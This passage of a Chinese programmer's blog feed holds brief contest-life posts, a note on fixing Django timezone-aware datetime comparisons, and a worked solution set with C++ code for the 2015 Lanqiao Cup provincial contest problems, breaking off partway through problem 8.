class="headerlink" title="After"></a>After</h3><p>比赛的时候查了不少资料，还复制粘贴了很多模板，结果竟然还是没打过现场赛的人。。。感觉很多知识点虽然知道但是不太熟练。。。继续学习。。。</p>]]></content>
      
      
        <tags>
            
            <tag> ACM </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Piece1</title>
      <url>/blog/2017/06/04/piece1/</url>
      <content type="html"><![CDATA[<p>三月份以后就一直没有发过博客蓝桥杯那两篇也是因为跟别人承诺过因为蓝桥杯省赛基本上都是水题实在是没啥好写的压轴题做了也没地方能交毫无意义。比完蓝桥杯省赛以后又开始学dp和流做的都是sb题和old题也没啥好写的。五月份每个周末都有比赛：先是江苏省赛又是买的题还跟湘潭赛一样真tm难还好没有完全按照去年的模式准备这场主要的遗憾是有一个写起来很短的前缀和的题目没想到，再是陕西邀请赛这场主要的遗憾是有一个sb题写得太慢了另外一个矩形枚举倒是没开错但是想法也不对，最后是蓝桥杯决赛每次都很无语填空题和大题的跨度实在太大了权当是旅游。<br>其实蓝桥杯决赛前后已经没做题了一直在做软件杯的网站和各种杂事昨天打了金马五校赛和计蒜客一下子做了这么多题而且感觉还不错于是决定今天还是要把解题报告发一下然后一打开博客发现都这么久没更新了又有这么多次比赛没总结所以又临时加了这一篇。从它仅有的标点判断我觉得能看完的人一定都是真爱23333333</p>]]></content>
      
      
        <tags>
            
            <tag> Life </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Django时间时区问题</title>
      <url>/blog/2017/05/06/Django%E6%97%B6%E9%97%B4%E6%97%B6%E5%8C%BA%E9%97%AE%E9%A2%98/</url>
      <content type="html"><![CDATA[<p>唉。。。写篇blog纪念一下浪费了我半个上午时间的问题。。。<br>写的是这么一个代码：<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">while pre<span class="selector-class">.time</span> != now<span class="selector-class">.time</span>:</div></pre></td></tr></table></figure></p><p><code>pre</code>是从数据库取出来的一条记录，<code>now</code>是我准备插入的一条记录，<code>.time</code>是<code>datetimeField</code>，对应程序里就是一个<code>datetime</code>对象。<br>结果这个条件怎么都是真的，也就是说<code>pre.time</code>和<code>now.time</code>总是不相等，我输出了一下发现<code>pre.time</code>是utc时间而且最后会带一个<code>+00:00</code>。<br>想到以前看到过的warning其实很好查到。<code>now.time</code>是一个 <strong>naive</strong> time，而<code>pre.time</code>是一个 aware time，其实就是带不带时区的问题，所以只要让<code>now.time</code>带上时区变成 aware time 就可以了。<br>然后就去查怎么变，其实第一个查到的就是对的。。。只是代码给的不全导致我产生了误解。。。查到的代码是：<br><figure class="highlight ini"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="attr">aware_time</span> = naive_time.replace(tzinfo=utc)</div></pre></td></tr></table></figure></p><p>写进去就显示 unresolved reference 我就觉得它很不靠谱，接着就查到了其他的问题。。。</p><ol><li><p>比如一个字符串<code>Sun, 28 Aug 2016 11:42:00 +0200</code>其实最后是带着时区的，那么怎么转换成 aware time呢？方案是：</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">from datetime import datetime</div><div class="line">date_published = datetime.strptime(date_published, <span class="string">"%a, %d %b %Y %H:%M:%S %z"</span>)</div></pre></td></tr></table></figure><p>看起来很棒棒啊！我就想直接给我的字符串也带上时区：<code>time_str += u&#39; +0800&#39;</code>，然后再用这个方法岂不是美滋滋？<br>结果就是一直 not match 。%z %Z +08:00 utc+8 都试了，甚至还查到了CCT啥的，还是不行。。。<del>SO要给我精神损失费啊TAT</del></p></li><li>attribute ‘tzinfo’ of ‘datetime.datetime’ objects is not writable<br>题主写的是 <code>book.creationTime.tzinfo = EST</code><br>答主说改成 <code>book.creationTime = book.creationTime.replace(tzinfo=EST)</code><br>我一想这人有点傻啊，但是他能用<code>EST</code>我也能用吧，反正加上了时区一切好说，大不了我再加加减减调整一下。。。大概是<code>aware_time = naive_time.replace(tzinfo=EST)</code> 很显然还是不行TAT</li></ol><p>最终解决方案：看这些查到的代码我一直以为既然有tzinfo这个类，应该就会有实现好的类，然而问这些的人可能都<code>import pytz</code>了。。。所以如果不想加上pytz实际上最佳的方案就是<strong>实现一个tzinfo的类</strong>。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime, timedelta, tzinfo</div><div class="line"></div><div class="line">ZERO_TIME_DELTA = timedelta(<span class="number">0</span>)</div><div class="line">LOCAL_TIME_DELTA = timedelta(hours=<span class="number">8</span>)  <span class="comment"># 本地时区偏差</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">LocalTimezone</span><span class="params">(tzinfo)</span>:</span></div><div class="line">    <span class="string">"""实现北京时间的类"""</span></div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">utcoffset</span><span class="params">(self, dt)</span>:</span></div><div class="line">        <span class="keyword">return</span> LOCAL_TIME_DELTA</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">dst</span><span class="params">(self, dt)</span>:</span></div><div class="line">        <span class="keyword">return</span> ZERO_TIME_DELTA</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">tzname</span><span class="params">(self, dt)</span>:</span></div><div class="line">        <span class="keyword">return</span> <span class="string">'+08:00'</span></div><div class="line"></div><div class="line"></div><div class="line">forma = <span class="string">"%Y-%m-%d %H:%M"</span></div><div class="line">now.time = datetime.strptime(time_str, forma).replace(tzinfo=LocalTimezone())</div></pre></td></tr></table></figure></p><p><em>update</em>：实际上<code>import pytz</code>就是最佳的解决方案，这些方法实在是太挫了。。。</p>]]></content>
      
      
        <tags>
            
            <tag> Bug </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>2015年蓝桥杯省赛C/C++ A组题解（含题目）</title>
      <url>/blog/2017/03/22/2015-lanqiao1/</url>
      <content type="html"><![CDATA[<h3 id="1-方程整数解"><a href="#1-方程整数解" class="headerlink" title="1. 方程整数解"></a>1. 方程整数解</h3><blockquote><p>方程: a^2 + b^2 + c^2 = 1000<br>这个方程有整数解吗？有：a,b,c=6,8,30 就是一组解。<br>你能算出另一组合适的解吗？<br>请填写该解中最小的数字。<br>注意：你提交的应该是一个整数，不要填写任何多余的内容或说明性文字。 </p></blockquote><p>枚举<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=<span class="number">33</span>;i++) &#123;</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j=i;j&lt;=<span class="number">33</span>;j++) &#123;</div><div class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> k=j;k&lt;=<span class="number">33</span>;k++) &#123;</div><div class="line">                <span class="keyword">if</span> (i*i+j*j+k*k==<span class="number">1000</span>) &#123;</div><div class="line">                    <span class="built_in">printf</span>(<span class="string">"%d %d %d\n"</span>,i,j,k);</div><div class="line">                &#125;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>答案：<code>10</code></p><h3 id="2-星系炸弹"><a href="#2-星系炸弹" class="headerlink" title="2. 星系炸弹"></a>2. 星系炸弹</h3><blockquote><p>在X星系的广袤空间中漂浮着许多X星人造“炸弹”，用来作为宇宙中的路标。<br>每个炸弹都可以设定多少天之后爆炸。<br>比如：阿尔法炸弹2015年1月1日放置，定时为15天，则它在2015年1月16日爆炸。<br>有一个贝塔炸弹，2014年11月9日放置，定时为1000天，请你计算它爆炸的准确日期。<br>请填写该日期，格式为 yyyy-mm-dd<br>即4位年份2位月份2位日期。比如：<br>2015-02-19<br>请严格按照格式书写。不能出现其它文字或符号。</p></blockquote><p>想一下，我们用的可是一台电脑！写这个程序的话实在是太费时间了。</p><h4 id="Step1"><a href="#Step1" class="headerlink" title="Step1."></a>Step1.</h4><p>复制“2014年11月9日”，粘贴到excel，并把单元格格式改成日期<br><img src="http://img.blog.csdn.net/20170313161320145" alt=""></p><h4 id="Step2"><a href="#Step2" class="headerlink" title="Step2."></a>Step2.</h4><p>移动到A2，输入”=SUM(A1,1000)”，按一下回车<br><img src="http://img.blog.csdn.net/20170313162201986" alt=""></p><p>欧了 =。= 开心不<br>答案：<code>2017-08-05</code></p><h3 id="3-奇妙的数字"><a href="#3-奇妙的数字" class="headerlink" title="3. 奇妙的数字"></a>3. 奇妙的数字</h3><blockquote><p>小明发现了一个奇妙的数字。它的平方和立方正好把0~9的10个数字每个用且只用了一次。<br>你能猜出这个数字是多少吗？<br>请填写该数字，不要填写任何多余的内容。</p></blockquote><p>枚举+模拟<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"></div><div class="line"><span class="keyword">int</span> b[<span class="number">10</span>];</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">solu</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> b[])</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">while</span> (x) &#123;</div><div class="line">        b[x%<span class="number">10</span>]++;</div><div class="line">        x/=<span class="number">10</span>;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">1</span>,j;i&lt;<span class="number">9999</span>;i++) &#123;</div><div class="line">        <span class="built_in">memset</span>(b,<span class="number">0</span>,<span class="keyword">sizeof</span>(b));</div><div class="line">        solu(i*i,b);</div><div class="line">        solu(i*i*i,b);</div><div class="line">        <span class="keyword">for</span> (j=<span class="number">0</span>;j&lt;=<span class="number">9</span>;j++)</div><div class="line">            <span class="keyword">if</span> (b[j]!=<span class="number">1</span>) <span class="keyword">break</span>;</div><div class="line">        <span class="comment">//每个b[i]都等于1，j才会大于9</span></div><div class="line">        <span class="keyword">if</span> (j&gt;<span class="number">9</span>) &#123;</div><div class="line">            <span class="built_in">printf</span>(<span class="string">"%d\n"</span>,i);</div><div class="line">            <span class="keyword">break</span>;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>答案：<code>69</code></p><h3 id="4-格子中输出"><a href="#4-格子中输出" class="headerlink" title="4. 格子中输出"></a>4. 格子中输出</h3><blockquote><p>StringInGrid函数会在一个指定大小的格子中打印指定的字符串。<br>要求字符串在水平、垂直两个方向上都居中。<br>如果字符串太长，就截断。<br>如果不能恰好居中，可以稍稍偏左或者偏上一点。<br>下面的程序实现这个逻辑，请填写划线部分缺少的代码。<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">StringInGrid</span><span class="params">(<span class="keyword">int</span> width, <span class="keyword">int</span> height, <span class="keyword">const</span> <span class="keyword">char</span>* s)</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">int</span> i,k;</div><div class="line">    <span class="keyword">char</span> buf[<span class="number">1000</span>];</div><div class="line">    <span class="built_in">strcpy</span>(buf, s);</div><div class="line">    <span class="keyword">if</span>(<span class="built_in">strlen</span>(s)&gt;width<span class="number">-2</span>) buf[width<span class="number">-2</span>]=<span class="number">0</span>;</div><div class="line">    </div><div class="line">    <span class="built_in">printf</span>(<span class="string">"+"</span>);</div><div class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;width<span class="number">-2</span>;i++) <span class="built_in">printf</span>(<span class="string">"-"</span>);</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"+\n"</span>);</div><div class="line">    </div><div class="line">    <span class="keyword">for</span>(k=<span class="number">1</span>; k&lt;(height<span class="number">-1</span>)/<span class="number">2</span>;k++)&#123;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"|"</span>);</div><div class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;width<span class="number">-2</span>;i++) <span class="built_in">printf</span>(<span class="string">" "</span>);</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"|\n"</span>);</div><div class="line">    &#125;</div><div class="line">    </div><div class="line">    <span class="built_in">printf</span>(<span class="string">"|"</span>);</div><div class="line">    </div><div class="line">    <span class="built_in">printf</span>(<span class="string">"%*s%s%*s"</span>,__________________________________);  <span class="comment">//填空</span></div><div class="line">             </div><div class="line">    <span class="built_in">printf</span>(<span class="string">"|\n"</span>);</div><div class="line">    </div><div class="line">    <span class="keyword">for</span>(k=(height<span class="number">-1</span>)/<span class="number">2</span>+<span class="number">1</span>; k&lt;height<span class="number">-1</span>; k++)&#123;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"|"</span>);</div><div class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;width<span class="number">-2</span>;i++) <span class="built_in">printf</span>(<span class="string">" "</span>);</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"|\n"</span>);</div><div class="line">    &#125; </div><div class="line">    </div><div class="line">    <span class="built_in">printf</span>(<span class="string">"+"</span>);</div><div class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;width<span class="number">-2</span>;i++) <span class="built_in">printf</span>(<span class="string">"-"</span>);</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"+\n"</span>);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    StringInGrid(<span class="number">20</span>,<span class="number">6</span>,<span class="string">"abcd1234"</span>);</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>对于题目中数据，应该输出：<br><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="code">+------------------+</span></div><div class="line">|                  |</div><div class="line">|     abcd1234     |</div><div class="line">|                  |</div><div class="line"><span class="section">|                  |</span></div><div class="line">+------------------+</div></pre></td></tr></table></figure></p><p>注意：只填写缺少的内容，不要书写任何题面已有代码或说明性文字。</p></blockquote><p>很明显，填空的上面是输出上半部分，下面是输出下半部分，所以我们填的这个就是正中间那行。<br>要做这题首先要知道<code>%*s</code>是个什么。。。<del>我也不知道啊</del><br>反正当年是没填出的居多  <a href="https://zhidao.baidu.com/question/310414478.html" target="_blank" rel="noopener">输出控制符资料</a><br>也就是说碰到*的时候我们要额外给一个整型参数控制宽度。</p><p>我们看到第9行，buf已经完成了截断，而s没有截断，所以我们要用也只能用buf。<br>然后我们算出左边右边的宽度，值得注意的是，左右的宽度表达式是不一样的。<br>因为题目里说了不对称是要靠左，可以把<code>abcd1234</code>最后的4去掉看看效果。<br>感觉查了这么多博客都没一个人填对的。。。唉= =</p><p>答案：<code>(width-strlen(buf)-2)/2,&quot;&quot;,buf,(width-strlen(buf)-2+1)/2,&quot;&quot;</code></p><h3 id="5-九数组分数"><a href="#5-九数组分数" class="headerlink" title="5. 九数组分数"></a>5. 九数组分数</h3><blockquote><p>1,2,3…9 这九个数字组成一个分数，其值恰好为1/3，如何组法？<br>下面的程序实现了该功能，请填写划线部分缺失的代码。<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line">#include &lt;stdio.h&gt;</div><div class="line"></div><div class="line">void test(int x[])</div><div class="line">&#123;</div><div class="line">    int a = x[<span class="number">0</span>]*<span class="number">1000</span> + x[<span class="number">1</span>]*<span class="number">100</span> + x[<span class="number">2</span>]*<span class="number">10</span> + x[<span class="number">3</span>];</div><div class="line">    int b = x[<span class="number">4</span>]*<span class="number">10000</span> + x[<span class="number">5</span>]*<span class="number">1000</span> + x[<span class="number">6</span>]*<span class="number">100</span> + x[<span class="number">7</span>]*<span class="number">10</span> + x[<span class="number">8</span>];</div><div class="line">    </div><div class="line">    if(a*<span class="number">3</span>==b) printf(<span class="string">"%d / %d<span class="subst">\n</span>"</span>, a, b);</div><div class="line">&#125;</div><div class="line">    </div><div class="line">void f(int x[], int k)</div><div class="line">&#123;</div><div class="line">    int i,t;</div><div class="line">    if(k&gt;=<span class="number">9</span>)&#123;</div><div class="line">        test(x);</div><div class="line">        return;</div><div class="line">    &#125;</div><div class="line">    </div><div class="line">    for(i=k; i&lt;<span class="number">9</span>; i++)&#123;</div><div class="line">        &#123;t=x[k]; x[k]=x[i]; x[i]=t;&#125;</div><div class="line">        f(x,k+<span class="number">1</span>);</div><div class="line">        _________________________________ <span class="comment">// 填空处</span></div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">int main()</div><div class="line">&#123;</div><div class="line">    int x[] = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>&#125;;</div><div class="line">    f(x,<span class="number">0</span>);  </div><div class="line">    return <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>注意：只填写缺少的内容，不要书写任何题面已有代码或说明性文字。</p></blockquote><p>这主要考的是回溯的基本概念  <a href="http://www.cnblogs.com/steven_oyj/archive/2010/05/22/1741376.html" target="_blank" rel="noopener">回溯资料</a><br>简单的说这一次做的改变肯定要复原。</p><p>答案：<code>{t=x[k]; x[k]=x[i]; x[i]=t;}</code></p><h3 id="6-牌型种数"><a href="#6-牌型种数" class="headerlink" title="6. 牌型种数"></a>6. 牌型种数</h3><blockquote><p>小明被劫持到X赌城，被迫与其他3人玩牌。<br>一副扑克牌（去掉大小王牌，共52张），均匀发给4个人，每个人13张。<br>这时，小明脑子里突然冒出一个问题：<br>如果不考虑花色，只考虑点数，也不考虑自己得到的牌的先后顺序，自己手里能拿到的初始牌型组合一共有多少种呢？<br>请填写该整数，不要填写任何多余的内容或说明文字。</p></blockquote><p>dfs，当然首先要知道每个数字都有四张牌。<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"></div><div class="line"><span class="keyword">int</span> cnt[<span class="number">15</span>],ans=<span class="number">0</span>;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">dfs</span><span class="params">(<span class="keyword">int</span> dep,<span class="keyword">int</span> last)</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">if</span> (dep&gt;<span class="number">13</span>) &#123;</div><div class="line">        ans++;</div><div class="line">        <span class="keyword">return</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i=last;i&lt;=<span class="number">13</span>;i++) &#123;</div><div class="line">        <span class="keyword">if</span> (cnt[i]&lt;<span class="number">4</span>) &#123;</div><div class="line">            cnt[i]++;</div><div class="line">            dfs(dep+<span class="number">1</span>,i);</div><div class="line">            cnt[i]--;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    dfs(<span class="number">1</span>,<span class="number">1</span>);</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"%d\n"</span>,ans);</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>答案：<code>3598180</code></p><h3 id="7-手链样式"><a href="#7-手链样式" class="headerlink" title="7. 手链样式"></a>7. 手链样式</h3><blockquote><p>小明有3颗红珊瑚，4颗白珊瑚，5颗黄玛瑙。<br>他想用它们串成一圈作为手链，送给女朋友。<br>现在小明想知道：如果考虑手链可以随意转动或翻转，一共可以有多少不同的组合样式呢？ 请你提交该整数。不要填写任何多余的内容或说明性的文字。</p></blockquote><p>dfs写起来比较难受，这题就用<code>next_permutation</code>  <a href="http://blog.csdn.net/aipb2008/article/details/2227490" target="_blank" rel="noopener">next_permutation参考资料</a><br>本来想先用一个最朴素的方法试一试，结果很快就出来了。<br>所以只要把所有答案都记录下来，每次都正反判断一遍即可。<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"></div><div class="line"><span class="keyword">int</span> res[<span class="number">10000</span>][<span class="number">12</span>],a[<span class="number">12</span>];</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">bool</span> <span class="title">same</span><span class="params">(<span class="keyword">int</span> a[],<span class="keyword">int</span> b[])</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> k=<span class="number">0</span>;k&lt;<span class="number">12</span>;k++) &#123;</div><div class="line">        <span class="keyword">bool</span> f=<span class="literal">true</span>;</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">12</span>;i++) &#123;</div><div class="line">            <span class="keyword">if</span> (a[i]!=b[(i+k)%<span class="number">12</span>]) &#123;</div><div class="line">                f=<span class="literal">false</span>;</div><div class="line">                <span class="keyword">break</span>;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">if</span> (f) <span class="keyword">return</span> <span class="literal">true</span>;</div><div class="line">        f=<span class="literal">true</span>;</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">12</span>;i++) &#123;</div><div class="line">            <span class="keyword">if</span> (a[<span class="number">11</span>-i]!=b[(i+k)%<span class="number">12</span>]) &#123;</div><div class="line">                f=<span class="literal">false</span>;</div><div class="line">                <span class="keyword">break</span>;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">if</span> (f) <span class="keyword">return</span> <span class="literal">true</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">int</span> ans=<span class="number">0</span>;</div><div class="line">    a[<span class="number">0</span>]=a[<span class="number">1</span>]=a[<span class="number">2</span>]=<span class="number">1</span>;</div><div class="line">    a[<span class="number">3</span>]=a[<span class="number">4</span>]=a[<span class="number">5</span>]=a[<span class="number">6</span>]=<span class="number">2</span>;</div><div class="line">    a[<span class="number">7</span>]=a[<span class="number">8</span>]=a[<span class="number">9</span>]=a[<span class="number">10</span>]=a[<span class="number">11</span>]=<span class="number">3</span>;</div><div class="line">    <span class="keyword">do</span> &#123;</div><div class="line">        <span class="keyword">bool</span> ok=<span class="literal">true</span>;</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=ans;i++) &#123;</div><div class="line">            <span class="keyword">if</span> (same(res[i],a)) &#123;</div><div class="line">                ok=<span class="literal">false</span>;</div><div class="line">                <span class="keyword">break</span>;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">if</span> (ok) &#123;</div><div class="line">            ans++;</div><div class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">12</span>;i++) &#123;</div><div class="line">                res[ans][i]=a[i];</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">    &#125; <span class="keyword">while</span> (next_permutation(a,a+<span class="number">12</span>));</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"%d\n"</span>,ans);</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><h3 id="8-饮料换购"><a href="#8-饮料换购" class="headerlink" title="8. 饮料换购"></a>8. 饮料换购</h3><blockquote><p>乐羊羊饮料厂正在举办一次促销优惠活动。乐羊羊C型饮料，凭3个瓶盖可以再换一瓶C型饮料，并且可以一直循环下去(但不允许暂借或赊账)。</p><p>请你计算一下，如果小明不浪费瓶盖，尽量地参加活动，那么，对于他初始买入的n瓶饮料，最后他一共能喝到多少瓶饮料。</p><p>输入：一个整数n，表示开始购买的饮料数量（0 &lt; n &lt; 